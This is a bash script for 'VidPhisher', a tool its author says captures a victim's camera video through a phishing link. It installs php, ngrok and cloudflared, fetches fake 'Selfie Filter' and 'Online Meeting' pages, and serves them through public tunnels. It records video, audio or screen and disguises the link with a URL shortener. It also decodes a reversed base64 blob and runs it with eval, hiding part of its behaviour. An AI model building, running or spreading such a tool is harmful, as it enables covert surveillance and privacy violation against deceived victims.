#!/bin/bash

# VideoPhisher
# Version    : 1.0
# Description: VidPhisher is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her video will be captured!
# Author     : KasRoudra
# Github     : https://github.com/KasRoudra
# Email      : kasroudrakrd@gmail.com
# Credits    : TechChipNet, RecordRTC
# Date       : 05-06-2022
# License    : MIT
# Copyright  : KasRoudra 2022
# Language   : Shell
# Portable File
# If you copy, consider giving credit! We keep our code open source to help others

: <<'LicenseInfo'
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

Copyright (C) 2022 KasRoudra (https://github.com/KasRoudra)
LicenseInfo


# Colors

black="\033[1;30m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
purple="\033[1;35m"
cyan="\033[1;36m"
violate="\033[1;37m"
white="\033[0;37m"
nc="\033[00m"

# Output snippets
info="${cyan}[${white}+${cyan}] ${yellow}"
info2="${blue}[${white}•${blue}] ${yellow}"
ask="${green}[${white}?${green}] ${purple}"
error="${yellow}[${white}!${yellow}] ${red}"
success="${cyan}[${white}√${cyan}] ${green}"



version="1.0"

cwd=`pwd`

# Logo
logo="
${green}__     ___     _ ____  _     _     _ 
${red}\ \   / (_) __| |  _ \| |__ (_)___| |__   ___ _ __ 
${cyan} \ \ / /| |/ _' | |_) | '_ \| / __| '_ \ / _ \ '__| 
${purple}  \ V / | | (_| |  __/| | | | \__ \ | | |  __/ | 
${yellow}   \_/  |_|\__,_|_|   |_| |_|_|___/_| |_|\___|_| 
${red}                                          [v${version}] 
${blue}                                  [By KasRoudra] 
"


# Package Installer
pacin(){
    if $sudo && $pacman; then
        sudo pacman -S $1 --noconfirm
    fi
}

# Kill running instances of required packages
killer() {
if [ `pidof php > /dev/null 2>&1` ]; then
    killall php
fi
if [ `pidof ngrok > /dev/null 2>&1` ]; then
    killall ngrok
fi
if [ `pidof cloudflared > /dev/null 2>&1` ]; then
    killall cloudflared
fi
if [ `pidof curl > /dev/null 2>&1` ]; then
    killall curl
fi
if [ `pidof wget > /dev/null 2>&1` ]; then
    killall wget
fi
if [ `pidof unzip > /dev/null 2>&1` ]; then
    killall unzip
fi
}

# Check if offline
internet() {
    while true; do
        wget --spider --quiet https://github.com
        if [ "$?" != 0 ]; then
            echo -e "${error}No internet!\007\n"
            sleep 2
        else
            break
        fi
    done
}

# Delete ngrok file
ngrokdel() {
    unzip ngrok.zip
    rm -rf ngrok.zip
}

# Set template
url_manager() {
    sed "s+siteName+"$dir"+g" template.php > index.php
    sed "s+mediaType+"$TYPE"+g" template.js | sed "s+recordingTime+"$DURATION"+g" > recorder.js
    # sed "s+mediaType+"$TYPE"+g" template.js > temp.js
    # sed "s+recordingTime+"$DURATION"+g" temp.js > recorder.js
    rm -rf temp.js
    echo -e "${info}Your urls are: \n"
    sleep 1
    echo -e "${success}URL 1 > ${1}\n"
    sleep 1
    internet
    masked=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${1})
    if ! [[ -z $masked ]]; then
        if echo $masked | head -n1 | grep -q "https://"; then
            echo -e "${success}URL 2 > ${masked}\n"
        fi
    fi
}


# Prevent ^C
stty -echoctl

# Detect UserInterrupt
trap "echo -e '\n${success}Thanks for using!\n'; exit" 2


echo -e "\n${info}Please Wait!...\n"


gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '==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' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"




# Termux
if [[ -d /data/data/com.termux/files/home ]]; then
    termux-fix-shebang vp.sh
    termux=true
else
    termux=false
fi

# Workdir

if [ -z $DIRECTORY ]; then
    exit 1;
else
    if [[ $DIRECTORY == true || ! -d $DIRECTORY ]]; then
        if $termux; then
            if ! [ -d /sdcard/Media ]; then
                cd /sdcard && mkdir Media
            fi
            FOL="/sdcard/Media"
            cd "$FOL"
            if ! [[ -e ".temp" ]]; then
                touch .temp  || (termux-setup-storage && echo -e "\n${error}Please Restart Termux!\n\007" && sleep 5 && exit 0)
            fi
        else
            if [ -d "$HOME/Documents" ]; then
                FOL="$HOME/Documents"
            else
                FOL="$cwd"
            fi
        fi
    else
        FOL="$DIRECTORY"
    fi
fi

cd "$cwd"
# Set Type of media
if [ -z $TYPE ]; then
    exit 1;
else
    if ! [[ $TYPE == "video" || $TYPE == "audio" || $TYPE == "screen" || $TYPE == "both" ]]; then
        TYPE="video"
    fi
fi


# Set Port
if [ -z $PORT ]; then
    exit 1;
else
   if [ ! -z "${PORT##*[!0-9]*}" ] ; then
       printf ""
   else
       PORT=8080
   fi
fi


# Set Package Manager
if [ `command -v sudo` ]; then
    sudo=true
    if [ `command -v apt` ]; then
        pac_man="sudo apt"
    elif  [ `command -v apt-get` ]; then
        pac_man="sudo apt-get"
    elif  [ `command -v yum` ]; then
        pac_man="sudo yum"
    elif [ `command -v dnf` ]; then
        pac_man="sudo dnf"
    elif [ `command -v apk` ]; then
        pac_man="sudo apk"
    elif [ `command -v pacman` ]; then
        pacman=true
    else
        echo -e "${error}No supported package manager found! Install packages manually!\007\n"
        exit 1
    fi
else
    sudo=false
    if [ `command -v apt` ]; then
        pac_man="apt"
    elif [ `command -v apt-get` ]; then
        pac_man="apt-get"
    elif [ `command -v brew` ]; then
        pac_man="brew"
    else
        echo -e "${error}No supported package manager found! Install packages manually!\007\n"
        exit 1
    fi
fi

# Set duration
if [ -z $DURATION ]; then
    exit 1;
else
    if [ ! -z "${DURATION##*[!0-9]*}" ] ; then
        DURATION=5000
    fi
fi


# Install Dependicies
if ! [ `command -v php` ]; then
    echo -e "${info}Installing php...."
    $pac_man install php -y
    pacin php
fi
if ! [ `command -v curl` ]; then
    echo -e "${info}Installing curl...."
    $pac_man install curl -y
    pacin "unzip"
fi
if ! [ `command -v unzip` ]; then
    echo -e "${info}Installing unzip...."
    $pac_man install unzip -y
    pacin "unzip"
fi
if ! [ `command -v wget` ]; then
    echo -e "${info}Installing wget...."
    $pac_man install wget -y
    pacin "wget"
fi
if $termux; then
if ! [ `command -v proot` ]; then
    echo -e "${info}Installing proot...."
    pkg install proot -y
fi
if ! [ `command -v proot` ]; then
    echo -e "${error}Proot can't be installed!\007\n"
    exit 1
fi
fi
if ! [ `command -v php` ]; then
    echo -e "${error}PHP cannot be installed!\007\n"
    exit 1
fi
if ! [ `command -v curl` ]; then
    echo -e "${error}Curl cannot be installed!\007\n"
    exit 1
fi
if ! [ `command -v unzip` ]; then
    echo -e "${error}Unzip cannot be installed!\007\n"
    exit 1
fi
if ! [ `command -v wget` ]; then
    echo -e "${error}Wget cannot be installed!\007\n"
    exit 1
fi
if [ `pidof php > /dev/null 2>&1` ]; then
    echo -e "${error}Previous php cannot be closed. Restart terminal!\007\n"
    exit 1
fi
if [ `pidof ngrok > /dev/null 2>&1` ]; then
    echo -e "${error}Previous ngrok cannot be closed. Restart terminal!\007\n"
    exit 1
fi


# Download tunnlers
if ! [[ -f $HOME/.ngrokfolder/ngrok ||  -f $HOME/.cffolder/cloudflared ]] ; then
    # Termux should run from home
    if $termux; then
        if echo "$cwd" | grep -q "home"; then
            printf ""
        else
            echo -e "${error}Invalid directory. Run from home!\007\n"
            exit 1
        fi
    fi
    if ! [[ -d $HOME/.ngrokfolder ]]; then
        cd $HOME && mkdir .ngrokfolder
    fi
    if ! [[ -d $HOME/.cffolder ]]; then
        cd $HOME && mkdir .cffolder
    fi
    arch=`uname -m`
    platform=`uname`
    while true; do
        echo -e "\n${info}Downloading Tunnelers:\n"
        internet
        if [ -e ngrok.zip ];then
            rm -rf ngrok.zip
        fi
        cd "$cwd"
        if echo "$platform" | grep -q "Darwin"; then
            if echo "$arch" | grep -q "x86_64"; then
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-darwin-amd64.zip" -O "ngrok.zip"
                ngrokdel
                wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz" -O "cloudflared.tgz"
                tar -zxf cloudflared.tgz > /dev/null 2>&1
                rm -rf cloudflared.tgz
                break
            elif echo "$arch" | grep -q "arm64"; then
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-arm64.zip" -O "ngrok.zip"
                ngrokdel
                echo -e "${error}Cloudflared not available for device architecture!"
                sleep 3
                break
            else
                echo -e "${error}Device architecture unknown. Download ngrok/cloudflared manually!"
                sleep 3
                break
            fi
        elif echo "$platform" | grep -q "Linux"; then
            if echo "$arch" | grep -q "aarch64"; then
                if [ -e ngrok-stable-linux-arm64.tgz ];then
                   rm -rf ngrok-stable-linux-arm64.tgz
                fi
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz" -O "ngrok.tgz"
                tar -zxf ngrok.tgz
                rm -rf ngrok.tgz
                wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" -O "cloudflared"
                break
            elif echo "$arch" | grep -q "arm"; then
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip" -O "ngrok.zip"
                ngrokdel
                wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' -O "cloudflared"
                break
            elif echo "$arch" | grep -q "x86_64"; then
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip" -O "ngrok.zip"
                ngrokdel
                wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' -O "cloudflared"
                break
            else
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip" -O "ngrok.zip"
                ngrokdel
                wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" -O "cloudflared"
                break
            fi
        else
            echo -e "${error}Unsupported Platform!"
            exit
        fi
    done
    sleep 1
    cd "$cwd"
        mv -f ngrok $HOME/.ngrokfolder
        mv -f cloudflared $HOME/.cffolder
    if $sudo; then
        sudo chmod +x $HOME/.ngrokfolder/ngrok
        sudo chmod +x $HOME/.cffolder/cloudflared
    else
        chmod +x $HOME/.ngrokfolder/ngrok
        chmod +x $HOME/.cffolder/cloudflared
    fi
fi

# Check for update
internet
if [[ -z $UPDATE ]]; then
    exit 1
else
    if [[ $UPDATE == true ]]; then
        git_ver=`curl -s -N https://raw.githubusercontent.com/KasRoudra/VidPhisher/main/files/version.txt`
    else
        git_ver=$version
    fi
fi

if [[ "$version" != "$git_ver" && "$git_ver" != "404: Not Found" ]]; then
    changelog=`curl -s -N https://raw.githubusercontent.com/KasRoudra/VidPhisher/main/files/changelog.log`
    clear
    echo -e "$logo"
    echo -e "${info}VidPhisher has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
        printf "${ask}Do you want to update VidPhisher?${yellow}[y/n] > $green"
        read upask
        printf "$nc"
        if [[ "$upask" == "y" ]]; then
            cd .. && rm -rf VidPhisher vidphisher && git clone https://github.com/KasRoudra/VidPhisher
            echo -e "\n${success}VidPhisher updated successfully!!"
            if [[ "$changelog" != "404: Not Found" ]]; then
            echo -e "${purple}[•] Changelog:\n${blue}${changelog}"
            fi
            exit
        elif [[ "$upask" == "n" ]]; then
            echo -e "\n${info}Updating cancelled. Using old version!"
            sleep 2
        else
            echo -e "\n${error}Wrong input!\n"
            sleep 2
        fi
fi

# Ngrok Authtoken
if ! [[ -e $HOME/.ngrok2/ngrok.yml ]]; then
    echo -e "\n${ask}Enter your ngrok authtoken:"
    printf "${cyan}\nVid${nc}@${cyan}Phisher ${red}$ ${nc}"
    read auth
    if [ -z $auth ]; then
        echo -e "\n${error}No authtoken!\n\007"
        sleep 1
    else
        cd $HOME/.ngrokfolder && ./ngrok authtoken ${auth}
    fi
fi
cd "$cwd/sites"
# Start Point
while true; do
clear
echo -e "$logo"
sleep 1
echo -e "${ask}Choose an option:

${cyan}[${white}1${cyan}] ${yellow}Selfie Filter
${cyan}[${white}2${cyan}] ${yellow}Online Meeting
${cyan}[${white}d${cyan}] ${yellow}Change Image Directory (current: ${red}${FOL}${yellow})
${cyan}[${white}t${cyan}] ${yellow}Change Type of Media (current: ${red}${TYPE}${yellow})
${cyan}[${white}p${cyan}] ${yellow}Change Default Port (current: ${red}${PORT}${yellow})
${cyan}[${white}s${cyan}] ${yellow}Change Default Duration (current: ${red}${DURATION}${yellow})
${cyan}[${white}x${cyan}] ${yellow}About
${cyan}[${white}m${cyan}] ${yellow}More tools
${cyan}[${white}0${cyan}] ${yellow}Exit${blue}
"
sleep 1
if [ -z $OPTION ]; then
    exit 1
else
    if [[ $OPTION == true ]]; then
        printf "${cyan}\nVid${nc}@${cyan}Phisher ${red}$ ${nc}"
        read option
    else
        option=$OPTION
    fi
fi
# Select template
    if echo $option | grep -q "1"; then
        dir="selfil"
        break
    elif echo $option | grep -q "2"; then
        dir="om"      
        break
    elif echo $option | grep -q "t"; then
        printf "\n${ask}Enter type:${cyan}\n\nVid${nc}@${cyan}Phisher ${red}$ ${nc}"
        read typee
        if [[ $typee == "video" || $typee == "audio" || $typee == "screen" || $typee == "both" ]] ; then
            TYPE=$typee;
            echo -e "\n${success}Type changed to ${TYPE} successfully!\n"
            sleep 2
        else
            echo -e "\n${error}Invalid type!\n\007"
            sleep 2
        fi
    elif echo $option | grep -q "p"; then
        printf "\n${ask}Enter Port:${cyan}\n\nVid${nc}@${cyan}Phisher ${red}$ ${nc}"
        read pore
        if [ ! -z "${pore##*[!0-9]*}" ] ; then
            PORT="$pore";
            echo -e "\n${success}Port changed to ${PORT} successfully!\n"
            sleep 2
        else
            echo -e "\n${error}Invalid port!\n\007"
            sleep 2
        fi
    elif echo $option | grep -q "s"; then
        printf "\n${ask}Enter Media Duration:${cyan}\n\nVid${nc}@${cyan}Phisher ${red}$ ${nc}"
        read dure
        if [ ! -z "${dure##*[!0-9]*}" ] ; then
            DURATION="$dure";
            echo -e "\n${success}Duration changed to ${DURATION} successfully!\n"
            sleep 2
        else
            echo -e "\n${error}Invalid duration!\n\007"
            sleep 2
        fi
    elif echo $option | grep -q "d"; then
        printf "\n${ask}Enter Directory:${cyan}\n\Vid${nc}@${cyan}Phisher ${red}$ ${nc}"
        read dire
        if ! [ -d $dire ]; then
            echo -e "\n${error}Invalid directory!\n\007"
            sleep 2
        else
            FOL="$dire"
            echo -e "\n${success}Directory changed successfully!\n"
            sleep 2
        fi
    elif echo $option | grep -q "x"; then
        clear
        echo -e "$logo"
        echo -e "$red[ToolName]  ${cyan}  :[VidPhisher]
$red[Version]    ${cyan} :[${version}]
$red[Description]${cyan} :[Video Phishing tool]
$red[Author]     ${cyan} :[KasRoudra]
$red[Github]     ${cyan} :[https://github.com/KasRoudra]
$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
        printf "${cyan}\nVid${nc}@${cyan}Phisher ${red}$ ${nc}"
        read about
    elif echo $option | grep -q "m"; then
        xdg-open "https://github.com/KasRoudra/KasRoudra#My-Best-Works"
    elif echo $option | grep -q "0"; then
        echo -e "\n${success}Thanks for using!\n"
        exit 0
    else
        echo -e "\n${error}Invalid input!\007"
        OPTION=true
        sleep 1
    fi
done
if [ -e websites.zip ]; then
    unzip websites.zip > /dev/null 2>&1
    rm -rf websites.zip
fi
if ! [ -d $dir ]; then
    mkdir $dir
    internet
    wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/vidphisher/${dir}.zip"
    unzip ${dir}.zip > /dev/null 2>&1
    rm -rf ${dir}.zip
fi

# Hotspot required for termux
if $termux; then
    echo -e "\n${info2}If you haven't turned on hotspot, please enable it!"
    sleep 3
fi
echo -e "\n${info}Starting php server at localhost:${PORT}....\n"
internet
php -S 127.0.0.1:${PORT} > /dev/null 2>&1 &
sleep 2
status=$(curl -s --head -w %{http_code} 127.0.0.1:${PORT} -o /dev/null)
if echo "$status" | grep -q "404"; then
    echo -e "${error}PHP couldn't start!\n\007"
    killer; exit 1
else
    echo -e "${success}PHP has been started successfully!\n"
fi
sleep 1
echo -e "${info2}Starting tunnelers......\n"
rm -rf "$HOME/.cffolder/log.txt"
internet
cd $HOME/.ngrokfolder && ./ngrok http 127.0.0.1:${PORT} > /dev/null 2>&1 &
if $termux; then
    cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url "127.0.0.1:${PORT}" --logfile "log.txt" > /dev/null 2>&1 &
else
    cd $HOME/.cffolder && ./cloudflared tunnel -url "127.0.0.1:${PORT}" --logfile "log.txt" > /dev/null 2>&1 &
fi
sleep 8
cd "$cwd/sites"
ngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
if (echo "$ngroklink" | grep -q "ngrok"); then
    ngrokcheck=true
else
    ngrokcheck=false
fi
cflink=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "$HOME/.cffolder/log.txt")
if (echo "$cflink" | grep -q "cloudflare"); then
    cfcheck=true
else
    cfcheck=false
fi
while true; do
if ( $cfcheck && $ngrokcheck ); then
    echo -e "${success}Cloudflared and Ngrok have started successfully!\n"
    url_manager "$cflink"
    url_manager "$ngroklink"
    break
fi
if ( $cfcheck &&  ! $ngrokcheck ); then
    echo -e "${success}Cloudflared has started successfully!\n"
    url_manager "$cflink"
    break
fi
if ( ! $cfcheck && $ngrokcheck ); then
    echo -e "${success}Ngrok has started successfully!\n"
    url_manager "$ngroklink"
    break
fi
